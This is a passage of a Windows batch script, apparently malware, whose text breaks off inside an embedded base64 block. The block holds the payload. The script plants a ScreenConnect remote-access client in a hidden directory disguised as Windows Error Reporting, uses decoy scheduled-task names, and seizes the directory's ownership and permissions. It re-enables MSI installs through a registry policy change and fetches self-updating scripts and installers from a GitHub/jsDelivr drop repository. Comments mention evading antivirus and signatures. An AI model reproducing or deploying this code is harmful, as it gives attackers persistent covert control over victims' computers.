:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTU1DQpy
::ZW0gIE01NTogbm8gYXV0byBIRUFMIG1zaWV4ZWMgdW5sZXNzIDEwNjA7IEhFQUxU
::SFkgbmVlZHMgcmVsYXkgKEw0OCkuIFN0b3BzIEhFQUwgL3gga2lsbGluZyBvbmxp
::bmUgR3Vlc3RzLg0KcmVtICBNNTQ6IDEwNjAgYWx3YXlzIGJ5cGFzc2VzIGhlYWwg
::cmF0ZS1saW1pdDsgU1RPUFBFRCtyZWxheSBzdGFydC1vbmx5IChNNTMpLg0KcmVt
::ICBNNTI6IGF1dG8taGVhbCBzdHVjayBHcnl4YSAoMTA2MCtkaXIgLyBSVU5OSU5H
::IG5vIGdyeXhhLmNvbSBJbWFnZVBhdGgpIHZpYSBGOC9HNzsgcmVzdG9yZSBsaWIg
::aWYgQVYgYXRlIGl0Lg0KcmVtICBNNTE6IGZvcmNlX2dyeXhhLmZsYWcgcXVldWVz
::IG93bl9ncnl4YV9mb3JjZSBSRUlOU1RBTEwgKHBhbmVsIHdpcGUpLiBEYWlseSBw
::YXRoIHN0YXlzIGZyZWV6ZS4NCnJlbSAgTTUwOiBoYXNoLW1pc21hdGNoIOKGkiBC
::VUlMRCBmYWxsYmFjayAodW5zdGljayBDRE4tc3RhbGUgbWFpbikuDQpyZW0gIE00
::OTogRlJFRVpFIC0gbm8gYXV0byBHcnl4YSBtc2lleGVjIGZyb20gbW9uOyBzdGFy
::dC1vbmx5OyBtYW51YWwgZm9yY2Ugb25seS4NCnJlbSAgTTQ4OiBIQU5EUy1PRkYg
::YWxsIFNDIGludGVycnVwdCDigJQgb25seSBHcnl4YSBpbnN0YWxsLWlmLWFic2Vu
::dC4gTm8gZXh0ZXJtaW5hdGUvc2V2cnogL2kvc2MgZGVsZXRlLg0KcmVtICBNNDc6
::IEhBUkQgc3RvcCBHcnl4YSBpbnRlcnJ1cHRzIOKAlCBubyByYXcgc2V2cnogL2k7
::IGRldGVjdCBhbnkgbm9uLXNldnJ6IFNDOyBhZG9wdCBsaXZlIEZQLg0KcmVtICBN
::NDY6IFNUQVJUX1BFTkRJTkcgPSBhbGl2ZTsgbmV2ZXIgL3ggR3J5eGEgd2hpbGUg
::c2VydmljZSBleGlzdHMgKGNvbm5lY3QtZHJvcCkuDQpyZW0gIE00NTogTDQyIHNh
::ZmUgRlAgbWlncmF0ZSAoaW5zdGFsbCBuZXcgYmVmb3JlIHJlbW92aW5nIG9sZCBH
::cnl4YSkuDQpyZW0gIE00NDogZm9yY2VfZ3J5eGEuZmxhZyBtdXN0IE5PVCAveCBs
::aXZlIEdyeXhhIChMNDEgZm9yY2Utc2tpcC1pZi1ydW5uaW5nKS4NCnJlbSAgTTQz
::OiBBTVNJLXByb29mIEdyeXhhIGZhbGxiYWNrIHZpYSBvd25fZ3J5eGEuY21kIChw
::dXJlIG1zaWV4ZWMpIHdoZW4gUFMgYmxvY2tlZC9taXNzaW5nLg0KcmVtICBNNDI6
::IHNpZ25lZCBtYW5pZmVzdDsgc2V2cnouY2ZnOyBzaWJsaW5nLXNhZmUgc2V2cnog
::L2kuDQpyZW0gIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9j
::b21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXll
::ZEV4cGFuc2lvbg0KDQpzZXQgIktFRVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNl
::dCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpzZXQgIkdSWVhBX0ZQPTM2ZTUw
::NmZmMDE2YjIxNTEiDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxX
::aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURh
::dGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxP
::Rz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3Rh
::dGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3Rl
::bVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0Kc2V0ICJURz1odHRwczovL3Jhdy5n
::aXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi90
::Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiVEcyPWh0dHBz
::Oi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWlu
::L3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9
::aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1
::Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
::eS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50
::LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJB
::TkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2
::ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90
::PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQj1odHRwczovL3Jhdy5naXRo
::dWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25f
::bGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQjI9aHR0cHM6
::Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4v
::b3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05HUllYQT1o
::dHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
::LWRyb3AvbWFpbi9vd25fZ3J5eGEuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNl
::dCAiT1dOR1JZWEEyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRk
::eS9naXRodWItZHJvcEBtYWluL293bl9ncnl4YS5jbWQ/dD0lUkFORE9NJSVSQU5E
::T00lIg0Kc2V0ICJNQU5JRkVTVF9VUkw9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNv
::bnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vdXBkYXRlLm1hbmlm
::ZXN0P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTUFOSUZFU1RfU0lHX1VSTD1o
::dHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
::LWRyb3AvbWFpbi91cGRhdGUubWFuaWZlc3Quc2lnP3Q9JVJBTkRPTSUlUkFORE9N
::JSINCnNldCAiU0VWUlpfRVhQX1VSTD1odHRwczovL3Jhdy5naXRodWJ1c2VyY29u
::dGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9zZXZyel9leHBlY3Rl
::ZC5jZmc/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJTRVZSWl9FWFBfVVJMMj1o
::dHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BA
::bWFpbi9zZXZyel9leHBlY3RlZC5jZmc/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0
::ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0
::LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfR1JZ
::WEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
::U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9QS0cxPWh0dHBz
::Oi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJv
::cC9tYWluL3BrZy5tc2kiDQpzZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVs
::aXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3BrZy5tc2kiDQpz
::ZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAu
::bXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2kiDQpzZXQgIk1TSV9HPSVQ
::cm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5tc2kiDQpzZXQgIk1TSUNB
::Q0hFX0c9JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1kICIlV0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+
::IiVMT0clIiAyPm51bA0KDQpzZXQgIk1PTlZFUj1NNTUiDQpzZXQgIlBGODY9JVBy
::b2dyYW1GaWxlcyh4ODYpJSINCnNldCAiR1JZWEFfREVFUD0lV0QlXGdyeXhhX2Rl
::ZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQgR3J5eGEgRlAgKG1heSByb3RhdGUg
::d2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQppZiBleGlzdCAiJVdEJVxncnl4YS5j
::ZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGlu
::ICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAi
::IHNldCAiR1JZWEFfRlA9JSVMIg0KaWYgbm90IGRlZmluZWQgR1JZWEFfRlAgc2V0
::ICJHUllYQV9GUD0zNmU1MDZmZjAxNmIyMTUxIg0KZm9yIC9mICJ0b2tlbnM9MS0z
::IGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUlIikgZG8gc2V0ICJEVD0lZGF0ZSUg
::JXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVjaG8g4pSA4pSAIHRpY2sgIURUISBb
::dmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9HJSINCnNldCAiQ09VTlQ9MCINCnNl
::dCAiSU5TVEFMTEVEPTAiDQpzZXQgIlBSSU1fT0s9MCINCnNldCAiQUxUX09LPTAi
::DQpzZXQgIkZPUkVJR05fTEVGVD0wIg0Kc2V0ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0
::ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDilIDilIAgWzBdIHNpbmdsZS1mbGln
::aHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcgdGlja3MgcmFjaW5nIG1zaWV4ZWMp
::IOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRpY2subG9jayINCmlmIGV4aXN0ICIl
::TVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIlTVVURVglIikgZG8gc2V0ICJMT0NL
::QUdFPSUlfnRBIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
::aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclTVVURVglJykgLWFuZCAoKChH
::ZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJU1VVEVYJScgLUZvcmNl
::KS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDIwKSl7IGV4aXQgMSB9
::IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAo
::DQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAg
::IGVuZGxvY2FsDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVU
::SU1FJSAlUkFORE9NJT4iJU1VVEVYJSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBp
::ZGVudGl0eSAoYW50aS1zaWduYXR1cmUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdE
::JSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAv
::ZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxp
::ZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJUwiDQppZiBub3QgZGVmaW5lZCBU
::QVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIg0KaWYgbm90IGRlZmluZWQg
::VEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZlckhlYWx0aCINCmlmIG5vdCBkZWZp
::bmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlIb3N0UHJveHkiDQppZiBub3QgZGVm
::aW5lZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9VGNwSXBDb25mbGljdFJlcyINCmlmIG5v
::dCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIiDQppZiBub3QgZGVmaW5lZCBNT19C
::IHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSAIFtBXSBhdXRvLXVwZGF0ZSBjb3Jl
::IGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBub3QgZXhpc3QgIiVDVVJM
::JSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KcmVtIE0zNTogZ3VhcmFudGVlIHVwZGF0
::ZSBjaGFubmVsIOKAlCB1bmhhcmRlbiB3b3JrZGlyIGVhY2ggdGljayBhbmQgc3Rh
::Z2UgZG93bmxvYWRzDQpyZW0gaW4gQzpcV2luZG93c1xUZW1wIChuZXZlciBBQ0wt
::bG9ja2VkKSwgdGhlbiBtb3ZlIGludG8gJVdEJS4gTG9ja0RpciBjYW5ub3QgZnJl
::ZXplIHVzLg0Kc2V0ICJTVEFHRT0lU3lzdGVtUm9vdCVcVGVtcFwudXBkIg0KaWYg
::bm90IGV4aXN0ICIlU1RBR0UlIiBta2RpciAiJVNUQUdFJSIgPm51bCAyPiYxDQph
::dHRyaWIgLWggLXMgLXIgIiVXRCUiID5udWwgMj4mMQ0KdGFrZW93biAvRiAiJVdE
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVdEJSIgL3Jlc2V0IC9UIC9D
::IC9RID5udWwgMj4mMQ0KaWNhY2xzICIlV0QlIiAvZ3JhbnQgIk5UIEFVVEhPUklU
::WVxTWVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1pbmlzdHJhdG9yczooT0kp
::KENJKUYiIC9UIC9DIC9RID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0Ql
::XHRnX3JlcG9ydC5wczEiICIlV0QlXG93bl9zZWN1cmUuY21kIiAiJVdEJVxvd25f
::bGliLnBzMSIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KDQpzZXQgIlNF
::TEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0
::LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXHRnX3JlcG9ydC5u
::ZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVNUQUdFJVx0Z19y
::ZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4
::LXRpbWUgNDAgLW8gIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVURzIlIiA+bnVs
::IDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGlt
::ZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFHRSVcb3duX3NlY3VyZS5uZXci
::ICIlT1dOU0VDJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVTVEFHRSVcb3du
::X3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1t
::YXgtdGltZSAzMCAtbyAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMy
::JSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25u
::ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0UlXG93bl9saWIu
::bmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlU1RBR0Ul
::XG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0t
::bWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX2xpYi5uZXciICIlT1dOTElCMiUi
::ID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVj
::dC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVNUQUdFJVxvd25fbW9uLm5l
::eHQiICIlT1dOTU9OJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVTVEFHRSVc
::b3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0t
::bWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJU9XTk1PTjIl
::IiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5l
::Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVcb3duX2dyeXhh
::Lm5ldyIgIiVPV05HUllYQSUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlU1RB
::R0UlXG93bl9ncnl4YS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0
::IDggLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJU9X
::TkdSWVhBMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tl
::IC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVx1
::cGRhdGUubWFuaWZlc3QiICIlTUFOSUZFU1RfVVJMJSIgPm51bCAyPiYxDQoiJUNV
::UkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAtLW1h
::eC10aW1lIDIwIC1vICIlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdC5zaWciICIlTUFO
::SUZFU1RfU0lHX1VSTCUiID5udWwgMj4mMQ0KDQpyZW0gTTQyOiBzaWduZWQgdXBk
::YXRlLm1hbmlmZXN0IGdhdGUgKFJTQS1TSEEyNTYpLiBGYWxsYmFjayB0byBCVUlM
::RCBtYXJrZXJzIGlmIG5vIHB1YmtleSB5ZXQuDQpzZXQgIlVQRF9PSz0wIg0Kc2V0
::ICJNQVA9Ig0KaWYgZXhpc3QgIiVTVEFHRSVcb3duX2xpYi5uZXciIHNldCAiTUFQ
::PSFNQVAhb3duX2xpYi5wczE9JVNUQUdFJVxvd25fbGliLm5ldzsiDQppZiBleGlz
::dCAiJVNUQUdFJVxvd25fbW9uLm5leHQiIHNldCAiTUFQPSFNQVAhb3duX21vbi5j
::bWQ9JVNUQUdFJVxvd25fbW9uLm5leHQ7Ig0KaWYgZXhpc3QgIiVTVEFHRSVcb3du
::X3NlY3VyZS5uZXciIHNldCAiTUFQPSFNQVAhb3duX3NlY3VyZS5jbWQ9JVNUQUdF
::JVxvd25fc2VjdXJlLm5ldzsiDQppZiBleGlzdCAiJVNUQUdFJVx0Z19yZXBvcnQu
::bmV3IiBzZXQgIk1BUD0hTUFQIXRnX3JlcG9ydC5wczE9JVNUQUdFJVx0Z19yZXBv
::cnQubmV3OyINCmlmIGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciIHNldCAi
::TUFQPSFNQVAhb3duX2dyeXhhLmNtZD0lU1RBR0UlXG93bl9ncnl4YS5uZXc7Ig0K
::c2V0ICJWUkVTPW1pc3NpbmciDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
::aWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0IiBpZiBleGlzdCAiJVNU
::QUdFJVx1cGRhdGUubWFuaWZlc3Quc2lnIiBpZiBkZWZpbmVkIE1BUCAoDQogIGZv
::ciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB2ZXJpZnktdXBkYXRlIC1X
::b3JrRGlyICIlV0QlIiAtRXh0cmEgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0fCVT
::VEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZ3whTUFQISJgKSBkbyBzZXQgIlZSRVM9
::JSVSIg0KKQ0KZWNobyB1cGRhdGVfdmVyaWZ5PSFWUkVTIT4+IiVMT0clIg0KaWYg
::L0kgIiFWUkVTISI9PSJvayIgKA0KICBzZXQgIlVQRF9PSz0xIg0KKSBlbHNlIGlm
::IC9JICIhVlJFUyEiPT0ibWlzc2luZyIgKA0KICBzZXQgIlVQRF9PSz1mYWxsYmFj
::ayINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im5vLXB1YmtleSIgKA0KICBzZXQg
::IlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAiIVZSRVM6fjAsMTAhIj09
::Im5vdC1pbi1tYW4iICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2Ug
::aWYgL0kgIiFWUkVTOn4wLDEzISI9PSJoYXNoLW1pc21hdGNoIiAoDQogIHJlbSBN
::NTA6IENETiBtYXkgc2VydmUgc3RhbGUgbWFpbiB3aGlsZSBtYW5pZmVzdCBpcyBm
::cmVzaCDigJQgbmV2ZXIgcmVmdXNlLWFsbCAodGhhdCBzdHVjayBmbGVldCBvbiBN
::NDgpLg0KICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCiAgZWNobyB1cGRhdGVfaGFz
::aF9taXNtYXRjaF9mYWxsYmFja18hVlJFUyE+PiIlTE9HJSINCikgZWxzZSAoDQog
::IGVjaG8gdXBkYXRlX3JlZnVzZWRfIVZSRVMhPj4iJUxPRyUiDQopDQoNCmlmIC9J
::ICIhVVBEX09LISI9PSIxIiAoDQogIGlmIGV4aXN0ICIlU1RBR0UlXHRnX3JlcG9y
::dC5uZXciIG1vdmUgL3kgIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIgIiVXRCVcdGdf
::cmVwb3J0LnBzMSIgPm51bCAyPiYxDQogIGlmIGV4aXN0ICIlU1RBR0UlXG93bl9z
::ZWN1cmUubmV3IiBtb3ZlIC95ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJVdE
::JVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQogIGlmIGV4aXN0ICIlU1RBR0Ul
::XG93bl9saWIubmV3IiBtb3ZlIC95ICIlU1RBR0UlXG93bl9saWIubmV3IiAiJVdE
::JVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQogIGlmIGV4aXN0ICIlU1RBR0UlXG93
::bl9ncnl4YS5uZXciIGZpbmRzdHIgL0M6Ik9XTl9HUllYQSBCVUlMRCIgIiVTVEFH
::RSVcb3duX2dyeXhhLm5ldyIgPm51bCAyPiYxICYmIG1vdmUgL3kgIiVTVEFHRSVc
::b3duX2dyeXhhLm5ldyIgIiVXRCVcb3duX2dyeXhhLmNtZCIgPm51bCAyPiYxDQog
::IHNldCAiU0VMRl9VUEQ9MCINCiAgaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5u
::ZXh0IiAoDQogICAgZmMgL2IgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJVdEJVxv
::d25fbW9uLmNtZCIgPm51bCAyPiYxDQogICAgaWYgZXJyb3JsZXZlbCAxIHNldCAi
::U0VMRl9VUEQ9MSINCiAgICBpZiAiIVNFTEZfVVBEISI9PSIwIiBkZWwgL2YgL3Eg
::IiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCiAgKQ0KKSBlbHNlIGlm
::IC9JICIhVVBEX09LISI9PSJmYWxsYmFjayIgKA0KICBmaW5kc3RyIC9DOiJUR19S
::RVBPUlQgQlVJTEQiICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciID5udWwgMj4mMSAm
